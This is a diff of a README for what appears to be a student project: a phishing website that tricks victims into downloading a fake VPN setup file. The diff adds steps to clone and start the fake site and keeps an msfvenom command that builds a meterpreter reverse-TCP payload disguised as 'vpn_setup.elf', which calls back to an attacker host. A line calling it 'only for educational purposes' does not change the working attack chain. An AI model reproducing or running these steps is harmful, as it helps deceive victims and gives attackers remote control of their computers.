@@ -6,6 +6,9 @@ This repo contains the server-side rendering code for a phishing website called 
 
 We are setting up a reverse shell on the victim's computer which will connect to the attacker's machine which is listening to the connection request from any machine after the malicious file has been sent!
 
+Note: This is only for educational purposes!
+
+
 ## Project Contributors
 
 - Pranauv Kumar
@@ -39,7 +42,31 @@ Kali's IP - 192.168.100.4 and Ubuntu's IP - 192.168.100.5
 
 In Kali Linux,
 
-Firsly, create the malicious .elf executable file using msfvenom toolkit. The code is as given below:
+Firstly, Clone the project to have the Fake Website ready for the victim to download the malicious VPN setup file. 
+
+```bash
+  git clone https://github.com/Pranauv-Kumar1803/ICS.git
+```
+
+Go to the project directory
+
+```bash
+  cd ICS
+```
+
+Install dependencies in both client and server folder
+
+```bash
+  npm install
+```
+
+Start the server
+
+```bash
+  npm start
+```
+
+Next, create the malicious .elf executable file using msfvenom toolkit. The code is as given below:
 ```bash
   msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.100.4 LPORT=4443 -f elf > vpn_setup.elf
 ```
